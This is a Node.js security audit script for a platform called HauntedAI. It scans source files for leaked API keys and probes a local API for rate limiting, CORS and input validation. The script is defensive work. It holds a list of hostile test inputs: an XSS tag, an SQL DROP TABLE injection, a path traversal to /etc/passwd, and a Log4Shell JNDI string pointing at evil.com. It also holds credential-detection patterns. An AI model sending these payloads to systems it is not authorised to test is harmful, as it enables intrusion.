#!/usr/bin/env node

/**
 * Security Audit Script for HauntedAI Platform
 * Checks for exposed API keys, JWT strength, rate limiting, etc.
 * Managed by Kiro
 */

const fs = require('fs');
const path = require('path');
const axios = require('axios');

// Colors for output
const colors = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m',
};

function log(message, color = 'reset') {
  console.log(`${colors[color]}[SECURITY-AUDIT] ${message}${colors.reset}`);
}

function success(message) {
  log(`✅ ${message}`, 'green');
}

function error(message) {
  log(`❌ ${message}`, 'red');
}

function info(message) {
  log(`ℹ️  ${message}`, 'blue');
}

function warning(message) {
  log(`⚠️  ${message}`, 'yellow');
}

class SecurityAuditor {
  constructor() {
    this.issues = [];
    this.warnings = [];
    this.apiUrl = process.env.API_URL || 'http://localhost:3001';
  }

  async runSecurityAudit() {
    log('🔒 Starting HauntedAI Security Audit', 'magenta');
    log('='.repeat(60), 'cyan');

    try {
      await this.checkExposedSecrets();
      await this.checkJWTSecurity();
      await this.checkRateLimiting();
      await this.checkInputValidation();
      await this.checkCORSConfiguration();
      await this.checkHTTPSRedirection();
      await this.checkDependencyVulnerabilities();
      await this.checkFilePermissions();
      
      this.generateSecurityReport();
      
    } catch (err) {
      error(`Security audit failed: ${err.message}`);
      process.exit(1);
    }
  }

  async checkExposedSecrets() {
    info('Checking for exposed API keys and secrets...');
    
    const sensitivePatterns = [
      /sk-[a-zA-Z0-9]{48}/g, // OpenAI API keys
      /xoxb-[0-9]{11}-[0-9]{11}-[a-zA-Z0-9]{24}/g, // Slack tokens
      /ghp_[a-zA-Z0-9]{36}/g, // GitHub tokens
      /AKIA[0-9A-Z]{16}/g, // AWS access keys
      /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/g, // UUIDs that might be secrets
    ];

    const filesToCheck = this.findSourceFiles();
    let secretsFound = false;

    for (const file of filesToCheck) {
      try {
        const content = fs.readFileSync(file, 'utf8');
        
        for (const pattern of sensitivePatterns) {
          const matches = content.match(pattern);
          if (matches) {
            this.issues.push({
              type: 'exposed_secret',
              severity: 'critical',
              file,
              message: `Potential secret found: ${matches[0].substring(0, 10)}...`,
            });
            secretsFound = true;
          }
        }
      } catch (err) {
        // Skip files that can't be read
      }
    }

    if (!secretsFound) {
      success('No exposed secrets found in source code');
    } else {
      error('Potential secrets found in source code');
    }
  }

  async checkJWTSecurity() {
    info('Checking JWT security configuration...');
    
    // Check JWT secret strength
    const envFiles = ['.env', 'apps/api/.env', '.env.example'];
    let jwtSecretFound = false;
    
    for (const envFile of envFiles) {
      if (fs.existsSync(envFile)) {
        const content = fs.readFileSync(envFile, 'utf8');
        const jwtMatch = content.match(/JWT_SECRET\s*=\s*(.+)/);
        
        if (jwtMatch) {
          jwtSecretFound = true;
          const secret = jwtMatch[1].trim();
          
          if (secret.length < 32) {
            this.issues.push({
              type: 'weak_jwt_secret',
              severity: 'high',
              file: envFile,
              message: 'JWT secret is too short (< 32 characters)',
            });
          } else if (secret === 'your-jwt-secret' || secret === 'changeme') {
            this.issues.push({
              type: 'default_jwt_secret',
              severity: 'critical',
              file: envFile,
              message: 'JWT secret is using default/example value',
            });
          } else {
            success('JWT secret appears to be properly configured');
          }
        }
      }
    }
    
    if (!jwtSecretFound) {
      this.warnings.push({
        type: 'missing_jwt_config',
        message: 'JWT_SECRET not found in environment files',
      });
    }
  }

  async checkRateLimiting() {
    info('Testing rate limiting...');
    
    try {
      const requests = [];
      const testEndpoint = `${this.apiUrl}/health`;
      
      // Send 20 rapid requests
      for (let i = 0; i < 20; i++) {
        requests.push(axios.get(testEndpoint, { timeout: 5000 }));
      }
      
      const responses = await Promise.allSettled(requests);
      const rateLimited = responses.some(r => 
        r.status === 'fulfilled' && r.value.status === 429
      );
      
      if (rateLimited) {
        success('Rate limiting is working');
      } else {
        this.warnings.push({
          type: 'no_rate_limiting',
          message: 'No rate limiting detected on API endpoints',
        });
      }
      
    } catch (err) {
      warning(`Rate limiting test failed: ${err.message}`);
    }
  }

  async checkInputValidation() {
    info('Testing input validation...');
    
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      "'; DROP TABLE users; --",
      '../../../etc/passwd',
      '${jndi:ldap://evil.com/a}',
      'javascript:alert(1)',
    ];
    
    try {
      for (const input of maliciousInputs) {
        const response = await axios.post(`${this.apiUrl}/api/v1/auth/login`, {
          walletAddress: input,
          signature: input,
          message: input,
        }, { 
          timeout: 5000,
          validateStatus: () => true // Don't throw on 4xx/5xx
        });
        
        if (response.status === 200) {
          this.issues.push({
            type: 'input_validation_bypass',
            severity: 'high',
            message: `Malicious input accepted: ${input.substring(0, 20)}...`,
          });
        }
      }
      
      success('Input validation appears to be working');
      
    } catch (err) {
      warning(`Input validation test failed: ${err.message}`);
    }
  }

  async checkCORSConfiguration() {
    info('Checking CORS configuration...');
    
    try {
      const response = await axios.options(`${this.apiUrl}/api/v1/health`, {
        headers: {
          'Origin': 'https://evil.com',
          'Access-Control-Request-Method': 'POST',
        },
        timeout: 5000,
        validateStatus: () => true
      });
      
      const corsHeader = response.headers['access-control-allow-origin'];
      
      if (corsHeader === '*') {
        this.issues.push({
          type: 'permissive_cors',
          severity: 'medium',
          message: 'CORS allows all origins (*)',
        });
      } else if (corsHeader && corsHeader.includes('evil.com')) {
        this.issues.push({
          type: 'cors_bypass',
          severity: 'high',
          message: 'CORS allows unauthorized origins',
        });
      } else {
        success('CORS configuration appears secure');
      }
      
    } catch (err) {
      warning(`CORS test failed: ${err.message}`);
    }
  }

  async checkHTTPSRedirection() {
    info('Checking HTTPS redirection...');
    
    // This would be more relevant in production
    if (this.apiUrl.startsWith('http://')) {
      this.warnings.push({
        type: 'http_not_https',
        message: 'API is running on HTTP instead of HTTPS',
      });
    } else {
      success('API is using HTTPS');
    }
  }

  async checkDependencyVulnerabilities() {
    info('Checking for dependency vulnerabilities...');
    
    const packageFiles = [
      'package.json',
      'apps/api/package.json',
      'apps/web/package.json',
      'apps/shared/package.json',
    ];
    
    for (const packageFile of packageFiles) {
      if (fs.existsSync(packageFile)) {
        try {
          const packageData = JSON.parse(fs.readFileSync(packageFile, 'utf8'));
          const dependencies = {
            ...packageData.dependencies,
            ...packageData.devDependencies,
          };
          
          // Check for known vulnerable packages
          const vulnerablePackages = [
            'lodash@4.17.20', // Example vulnerable version
            'axios@0.21.0',   // Example vulnerable version
          ];
          
          for (const [pkg, version] of Object.entries(dependencies)) {
            const pkgVersion = `${pkg}@${version}`;
            if (vulnerablePackages.includes(pkgVersion)) {
              this.issues.push({
                type: 'vulnerable_dependency',
                severity: 'medium',
                file: packageFile,
                message: `Vulnerable package: ${pkgVersion}`,
              });
            }
          }
          
        } catch (err) {
          warning(`Failed to parse ${packageFile}: ${err.message}`);
        }
      }
    }
    
    success('Dependency vulnerability check completed');
  }

  async checkFilePermissions() {
    info('Checking file permissions...');
    
    const sensitiveFiles = [
      '.env',
      'apps/api/.env',
      'private.key',
      'id_rsa',
    ];
    
    for (const file of sensitiveFiles) {
      if (fs.existsSync(file)) {
        try {
          const stats = fs.statSync(file);
          const mode = stats.mode & parseInt('777', 8);
          
          // Check if file is world-readable (others can read)
          if (mode & parseInt('004', 8)) {
            this.issues.push({
              type: 'insecure_file_permissions',
              severity: 'medium',
              file,
              message: 'Sensitive file is world-readable',
            });
          }
          
        } catch (err) {
          warning(`Failed to check permissions for ${file}: ${err.message}`);
        }
      }
    }
    
    success('File permissions check completed');
  }

  findSourceFiles() {
    const files = [];
    const extensions = ['.js', '.ts', '.tsx', '.json', '.env', '.md'];
    const excludeDirs = ['node_modules', 'dist', 'build', '.git'];
    
    const scanDir = (dir) => {
      try {
        const items = fs.readdirSync(dir);
        
        for (const item of items) {
          const fullPath = path.join(dir, item);
          const stat = fs.statSync(fullPath);
          
          if (stat.isDirectory() && !excludeDirs.includes(item)) {
            scanDir(fullPath);
          } else if (stat.isFile() && extensions.some(ext => item.endsWith(ext))) {
            files.push(fullPath);
          }
        }
      } catch (err) {
        // Skip directories we can't read
      }
    };
    
    scanDir('.');
    return files;
  }

  generateSecurityReport() {
    log('='.repeat(60), 'cyan');
    log('🔒 Security Audit Results', 'magenta');
    log('='.repeat(60), 'cyan');
    
    // Count issues by severity
    const critical = this.issues.filter(i => i.severity === 'critical').length;
    const high = this.issues.filter(i => i.severity === 'high').length;
    const medium = this.issues.filter(i => i.severity === 'medium').length;
    const low = this.issues.filter(i => i.severity === 'low').length;
    
    info(`Total Issues: ${this.issues.length}`);
    if (critical > 0) error(`Critical: ${critical}`);
    if (high > 0) error(`High: ${high}`);
    if (medium > 0) warning(`Medium: ${medium}`);
    if (low > 0) info(`Low: ${low}`);
    
    info(`Warnings: ${this.warnings.length}`);
    
    log('='.repeat(60), 'cyan');
    
    // Detailed issues
    if (this.issues.length > 0) {
      error('Security Issues Found:');
      this.issues.forEach((issue, index) => {
        error(`${index + 1}. [${issue.severity.toUpperCase()}] ${issue.message}`);
        if (issue.file) {
          info(`   File: ${issue.file}`);
        }
      });
      log('='.repeat(60), 'cyan');
    }
    
    // Warnings
    if (this.warnings.length > 0) {
      warning('Security Warnings:');
      this.warnings.forEach((warn, index) => {
        warning(`${index + 1}. ${warn.message}`);
      });
      log('='.repeat(60), 'cyan');
    }
    
    // Overall assessment
    if (critical > 0) {
      error('❌ CRITICAL security issues found! Immediate action required.');
      process.exit(1);
    } else if (high > 0) {
      error('⚠️  HIGH severity issues found. Please address before deployment.');
      process.exit(1);
    } else if (medium > 0) {
      warning('⚠️  MEDIUM severity issues found. Consider addressing.');
    } else {
      success('✅ No critical security issues found!');
    }
    
    // Recommendations
    log('='.repeat(60), 'cyan');
    info('Security Recommendations:');
    info('1. Use HTTPS in production');
    info('2. Implement proper rate limiting');
    info('3. Keep dependencies updated');
    info('4. Use strong JWT secrets (32+ characters)');
    info('5. Validate all user inputs');
    info('6. Configure CORS properly');
    info('7. Set secure file permissions');
    info('8. Regular security audits');
  }

  async run() {
    await this.runSecurityAudit();
  }
}

// Main execution
if (require.main === module) {
  const auditor = new SecurityAuditor();
  auditor.run().catch((err) => {
    error(`Security audit failed: ${err.message}`);
    process.exit(1);
  });
}

module.exports = SecurityAuditor;